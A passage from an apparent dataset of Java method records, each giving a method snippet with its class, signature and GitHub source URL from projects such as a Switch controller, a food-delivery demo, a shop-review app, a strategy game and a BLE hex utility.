"https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperEntityResolver.java", "stars": "15", "class_props": {"extends": null, "implements": ["EntityResolver"], "modifiers": ["public"]}}, {"id": 55388, "method_name": "pressButton", "class_name": "Packet", "params": ["Button"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pressButton(final Button button) {\n        final short value = (short) button.val;\n        final byte b0 = (byte) (value >> 8);\n        final byte b1 = (byte) value;\n        buffer[0] |= b0;\n        buffer[1] |= b1;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55389, "method_name": "pressButton", "class_name": "Packet", "params": ["short"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pressButton(final short value) {\n        final byte b0 = (byte) (value >> 8);\n        final byte b1 = (byte) value;\n        buffer[0] |= b0;\n        buffer[1] |= b1;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55390, "method_name": "releaseButton", "class_name": "Packet", "params": ["Button"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseButton(final Button button) {\n        final short value = (short) button.val;\n        final byte b0 = (byte) (~value >> 8);\n        final byte b1 = (byte) ~value;\n        buffer[0] &= b0;\n        buffer[1] &= b1;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55391, "method_name": "releaseButton", "class_name": "Packet", "params": ["short"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseButton(final short value) {\n        final byte b0 = (byte) (~value >> 8);\n        final byte b1 = (byte) ~value;\n        buffer[0] &= b0;\n        buffer[1] &= b1;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55392, "method_name": "setDpad", "class_name": "Packet", "params": ["Dpad"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDpad(final Dpad dpad) {\n        buffer[2] = (byte) dpad.val;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55393, "method_name": "setDpad", "class_name": "Packet", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDpad(final byte dpad) {\n        buffer[2] = dpad;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55394, "method_name": "setLeftX", "class_name": "Packet", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLeftX(final byte lx) {\n        buffer[3] = lx;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55395, "method_name": "setLeftY", "class_name": "Packet", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLeftY(final byte ly) {\n        buffer[4] = ly;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55396, "method_name": "setRightX", "class_name": "Packet", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRightX(final byte rx) {\n        buffer[5] = rx;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55397, "method_name": "setRightY", "class_name": "Packet", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRightY(final byte ry) {\n        buffer[6] = ry;\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/util/src/main/java/com/javmarina/util/Packet.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55398, "method_name": "getId", "class_name": "\uc8fc\ubb38\ub428", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/msa-ez/example-food-delivery/master/app/src/main/java/fooddelivery/%EC%A3%BC%EB%AC%B8%EB%90%A8.java", "stars": "13", "class_props": {"extends": "AbstractEvent", "implements": null, "modifiers": ["public"]}}, {"id": 55399, "method_name": "setId", "class_name": "\uc8fc\ubb38\ub428", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Long id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/msa-ez/example-food-delivery/master/app/src/main/java/fooddelivery/%EC%A3%BC%EB%AC%B8%EB%90%A8.java", "stars": "13", "class_props": {"extends": "AbstractEvent", "implements": null, "modifiers": ["public"]}}, {"id": 55400, "method_name": "get\ud488\ubaa9", "class_name": "\uc8fc\ubb38\ub428", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String get\ud488\ubaa9() {\n        return \ud488\ubaa9;\n    }", "url": "https://raw.githubusercontent.com/msa-ez/example-food-delivery/master/app/src/main/java/fooddelivery/%EC%A3%BC%EB%AC%B8%EB%90%A8.java", "stars": "13", "class_props": {"extends": "AbstractEvent", "implements": null, "modifiers": ["public"]}}, {"id": 55401, "method_name": "set\ud488\ubaa9", "class_name": "\uc8fc\ubb38\ub428", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set\ud488\ubaa9(String \ud488\ubaa9) {\n        this.\ud488\ubaa9 = \ud488\ubaa9;\n    }", "url": "https://raw.githubusercontent.com/msa-ez/example-food-delivery/master/app/src/main/java/fooddelivery/%EC%A3%BC%EB%AC%B8%EB%90%A8.java", "stars": "13", "class_props": {"extends": "AbstractEvent", "implements": null, "modifiers": ["public"]}}, {"id": 55402, "method_name": "get\uc218\ub7c9", "class_name": "\uc8fc\ubb38\ub428", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer get\uc218\ub7c9() {\n        return \uc218\ub7c9;\n    }", "url": "https://raw.githubusercontent.com/msa-ez/example-food-delivery/master/app/src/main/java/fooddelivery/%EC%A3%BC%EB%AC%B8%EB%90%A8.java", "stars": "13", "class_props": {"extends": "AbstractEvent", "implements": null, "modifiers": ["public"]}}, {"id": 55403, "method_name": "set\uc218\ub7c9", "class_name": "\uc8fc\ubb38\ub428", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set\uc218\ub7c9(Integer \uc218\ub7c9) {\n        this.\uc218\ub7c9 = \uc218\ub7c9;\n    }", "url": "https://raw.githubusercontent.com/msa-ez/example-food-delivery/master/app/src/main/java/fooddelivery/%EC%A3%BC%EB%AC%B8%EB%90%A8.java", "stars": "13", "class_props": {"extends": "AbstractEvent", "implements": null, "modifiers": ["public"]}}, {"id": 55404, "method_name": "getRt_thanks_count", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getRt_thanks_count() {\n        return rt_thanks_count;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55405, "method_name": "setRt_thanks_count", "class_name": "MarketReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRt_thanks_count(Integer rt_thanks_count) {\n        this.rt_thanks_count = rt_thanks_count;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55406, "method_name": "getItemReviewID", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getItemReviewID() {\n        return itemReviewID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55407, "method_name": "setItemReviewID", "class_name": "MarketReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemReviewID(Integer itemReviewID) {\n        this.itemReviewID = itemReviewID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55408, "method_name": "getItemID", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getItemID() {\n        return itemID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55409, "method_name": "setItemID", "class_name": "MarketReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemID(Integer itemID) {\n        this.itemID = itemID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55410, "method_name": "getEndUserID", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getEndUserID() {\n        return endUserID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55411, "method_name": "setEndUserID", "class_name": "MarketReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEndUserID(Integer endUserID) {\n        this.endUserID = endUserID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55412, "method_name": "getRating", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getRating() {\n        return rating;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55413, "method_name": "setRating", "class_name": "MarketReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRating(Integer rating) {\n        this.rating = rating;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55414, "method_name": "getReviewText", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getReviewText() {\n        return reviewText;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55415, "method_name": "setReviewText", "class_name": "MarketReview", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReviewText(String reviewText) {\n        this.reviewText = reviewText;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55416, "method_name": "getReviewTitle", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getReviewTitle() {\n        return reviewTitle;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55417, "method_name": "setReviewTitle", "class_name": "MarketReview", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReviewTitle(String reviewTitle) {\n        this.reviewTitle = reviewTitle;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55418, "method_name": "getReviewDate", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Timestamp", "snippet": "    public Timestamp getReviewDate() {\n        return reviewDate;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55419, "method_name": "setReviewDate", "class_name": "MarketReview", "params": ["Timestamp"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReviewDate(Timestamp reviewDate) {\n        this.reviewDate = reviewDate;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55420, "method_name": "getRt_end_user_profile", "class_name": "MarketReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "User", "snippet": "    public User getRt_end_user_profile() {\n        return rt_end_user_profile;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55421, "method_name": "setRt_end_user_profile", "class_name": "MarketReview", "params": ["User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRt_end_user_profile(User rt_end_user_profile) {\n        this.rt_end_user_profile = rt_end_user_profile;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewMarket/MarketReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55422, "method_name": "tech", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TechStasisField", "snippet": "    public TechStasisField tech()   { return (TechStasisField) super.tech(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55423, "method_name": "isWeapon", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isWeapon()      { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55424, "method_name": "range", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int range()             { return tech().range; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55425, "method_name": "name", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String name()           { return tech().name(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55426, "method_name": "desc", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String desc()           { return tech().brief(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55427, "method_name": "validTarget", "class_name": "ShipSpecialStasisField", "params": ["CombatStack"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean validTarget(CombatStack tgt) {\n        if (!tgt.isShip())\n            return false;\n        if (tgt.immuneToStasis())\n            return false;\n        return !tgt.cloaked;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55428, "method_name": "reload", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reload()           { breakStasis(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55429, "method_name": "becomeDestroyed", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void becomeDestroyed()  { breakStasis(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55430, "method_name": "fireUpon", "class_name": "ShipSpecialStasisField", "params": ["CombatStack", "CombatStack", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void fireUpon(CombatStack source, CombatStack tgt, int count)   {\n        if (tgt.immuneToStasis())\n            return;\n        if (tgt.isShip()) {\n            target = (CombatStackShip) tgt;\n            tech().drawSpecialAttack(source, target, 1, 0);\n            target.inStasis = true;\n            target.missiles().clear();\n            if (source.mgr.ui != null)\n                source.mgr.ui.repaint();\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55431, "method_name": "breakStasis", "class_name": "ShipSpecialStasisField", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void breakStasis() {\n        if (target != null) {\n            target.inStasis = false;\n            target = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialStasisField.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 55432, "method_name": "isFinalWar", "class_name": "TreatyFinalWar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFinalWar()               { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/empires/TreatyFinalWar.java", "stars": "74", "class_props": {"extends": "DiplomaticTreaty", "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55433, "method_name": "listOrder", "class_name": "TreatyFinalWar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int listOrder()                    { return 1; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/empires/TreatyFinalWar.java", "stars": "74", "class_props": {"extends": "DiplomaticTreaty", "implements": ["Base"], "modifiers": ["public"]}}, {"id": 55434, "method_name": "main", "class_name": "MainClass", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        MainClass mainClass = new MainClass();\n\n        IPerson piyush = mainClass.getPersonFromDB(\"Piyush\");\n        IPerson ownerProxy = mainClass.getOwnerProxy(piyush);\n        ownerProxy.setGender(\"Male\");\n\n        IPerson nonOwnerProxy = mainClass.getNonOwnerProxy(piyush);\n        // Will throw exception\n        nonOwnerProxy.setGender(\"Male\");\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Proxy%20Pattern/Protection%20Proxy%20Pattern/src/MainClass.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55435, "method_name": "getOwnerProxy", "class_name": "MainClass", "params": ["IPerson"], "throws": null, "modifiers": [], "return_type": "IPerson", "snippet": "    IPerson getOwnerProxy(IPerson person) {\n        return (IPerson) Proxy.newProxyInstance(\n                person.getClass().getClassLoader(),\n                person.getClass().getInterfaces(),\n                new OwnerInvocationHandler(person));\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Proxy%20Pattern/Protection%20Proxy%20Pattern/src/MainClass.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55436, "method_name": "getNonOwnerProxy", "class_name": "MainClass", "params": ["IPerson"], "throws": null, "modifiers": [], "return_type": "IPerson", "snippet": "    IPerson getNonOwnerProxy(IPerson person) {\n        return (IPerson) Proxy.newProxyInstance(\n                person.getClass().getClassLoader(),\n                person.getClass().getInterfaces(),\n                new NonOwnerInvocationHandler(person));\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Proxy%20Pattern/Protection%20Proxy%20Pattern/src/MainClass.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55437, "method_name": "getPersonFromDB", "class_name": "MainClass", "params": ["String"], "throws": null, "modifiers": [], "return_type": "IPerson", "snippet": "    IPerson getPersonFromDB(String name) {\n        // let's assume this is fetching from DB\n        return null;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Proxy%20Pattern/Protection%20Proxy%20Pattern/src/MainClass.java", "stars": "38", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55438, "method_name": "a", "class_name": "DataDealUtil", "params": ["int"], "throws": ["Exception"], "modifiers": ["static", "private"], "return_type": "int", "snippet": "    private static int a(int var0) throws Exception {\n        int var1 = 1;\n        int var2 = 1;\n        if (var0 < 0) {\n            throw new Exception(\"nCount can't small than 1!\");\n        } else {\n            if (var0 != 0) {\n                int var3 = 0;\n\n                while (true) {\n                    var2 = var1;\n                    if (var3 >= var0) {\n                        break;\n                    }\n\n                    ++var3;\n                    var1 <<= 4;\n                }\n            }\n\n            return var2;\n        }\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/app/src/main/java/com/wxwteam/bleapp/utils/DataDealUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55439, "method_name": "a", "class_name": "DataDealUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] a(String var0) {\n        byte[] var7;\n        if (var0 != null && !var0.equals(\"\")) {\n            var0 = var0.toUpperCase();\n            int var1 = var0.length() / 2;\n            char[] var2 = var0.toCharArray();\n            byte[] var3 = new byte[var1];\n            int var4 = 0;\n\n            while (true) {\n                var7 = var3;\n                if (var4 >= var1) {\n                    break;\n                }\n\n                int var5 = var4 << 1;\n                byte var6 = (byte) \"0123456789ABCDEF\".indexOf(var2[var5]);\n                var3[var4] = (byte) ((byte) ((byte) \"0123456789ABCDEF\".indexOf(var2[var5 + 1]) | var6 << 4));\n                ++var4;\n            }\n        } else {\n            var7 = null;\n        }\n\n        return var7;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/app/src/main/java/com/wxwteam/bleapp/utils/DataDealUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55440, "method_name": "a", "class_name": "DataDealUtil", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String[] a(byte[] var0) {\n        String[] var6;\n        if (var0 != null && var0.length != 0) {\n            StringBuilder var1 = new StringBuilder();\n            int var2 = var0.length;\n            boolean var3 = true;\n\n            for (int var4 = 0; var4 < var2; var3 = false) {\n                byte var5 = var0[var4];\n                if (!var3) {\n                    var1.append(\",\");\n                }\n\n                var1.append(\"0123456789ABCDEF\".charAt((var5 & 240) >> 4));\n                var1.append(\"0123456789ABCDEF\".charAt(var5 & 15));\n                ++var4;\n            }\n\n            var6 = var1.toString().trim().split(\",\");\n        } else {\n            var6 = null;\n        }\n\n        return var6;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/app/src/main/java/com/wxwteam/bleapp/utils/DataDealUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55441, "method_name": "b", "class_name": "DataDealUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String b(String var0) {\n        String var1;\n        if (var0 != null && var0.length() % 2 == 0) {\n            String var2 = \"\";\n            int var3 = 0;\n\n            while (true) {\n                var1 = var2;\n                if (var3 >= var0.length()) {\n                    break;\n                }\n\n                var1 = \"0000\" + Integer.toBinaryString(Integer.parseInt(var0.substring(var3, var3 + 1), 16));\n                var2 = var2 + var1.substring(var1.length() - 4);\n                ++var3;\n            }\n        } else {\n            var1 = null;\n        }\n\n        return var1;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/app/src/main/java/com/wxwteam/bleapp/utils/DataDealUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55442, "method_name": "c", "class_name": "DataDealUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int c(String var0) {\n        byte var1 = 0;\n        byte var2 = 0;\n        int var3;\n        if (var0.length() <= 2 || var0.charAt(0) != '0' || var0.charAt(1) != 'X' && var0.charAt(1) != 'x') {\n            var3 = 0;\n        } else {\n            var3 = 2;\n        }\n\n        boolean var11;\n        while (true) {\n            if (var3 >= var0.length()) {\n                var11 = true;\n                break;\n            }\n\n            char var4 = var0.charAt(var3);\n            if ((var4 < '0' || var4 > '9') && (var4 < 'A' || var4 > 'F') && (var4 < 'a' || var4 > 'f')) {\n                var11 = false;\n                break;\n            }\n\n            ++var3;\n        }\n\n        int var8;\n        if (!var11) {\n            var8 = var2;\n        } else {\n            String var5 = var0.toUpperCase();\n            var0 = var5;\n            if (var5.length() > 2) {\n                var0 = var5;\n                if (var5.charAt(0) == '0') {\n                    var0 = var5;\n                    if (var5.charAt(1) == 'X') {\n                        var0 = var5.substring(2);\n                    }\n                }\n            }\n\n            int var12 = var0.length();\n            int var10 = 0;\n            var3 = var1;\n\n            while (true) {\n                var8 = var3;\n                if (var10 >= var12) {\n                    break;\n                }\n\n                label77:\n                {\n                    Exception var13;\n                    Exception var10000;\n                    label124:\n                    {\n                        char var9 = var0.charAt(var12 - var10 - 1);\n                        boolean var10001;\n                        if (var9 >= '0' && var9 <= '9') {\n                            var8 = var9 - 48;\n                        } else if (var9 >= 'a' && var9 <= 'f') {\n                            var8 = var9 - 97 + 10;\n                        } else {\n                            if (var9 < 'A' || var9 > 'F') {\n                                try {\n                                    var13 = new Exception(\"error param\");\n                                    throw var13;\n                                } catch (Exception var6) {\n                                    var10000 = var6;\n                                    var10001 = false;\n                                    break label124;\n                                }\n                            }\n\n                            var8 = var9 - 65 + 10;\n                        }\n\n                        try {\n                            var8 = var3 + var8 * a(var10);\n                        } catch (Exception var7) {\n                            var10000 = var7;\n                            var10001 = false;\n                            break label124;\n                        }\n\n                        var3 = var8;\n                        break label77;\n                    }\n\n                    var13 = var10000;\n                    var13.printStackTrace();\n                }\n\n                ++var10;\n            }\n        }\n\n        return var8;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/app/src/main/java/com/wxwteam/bleapp/utils/DataDealUtil.java", 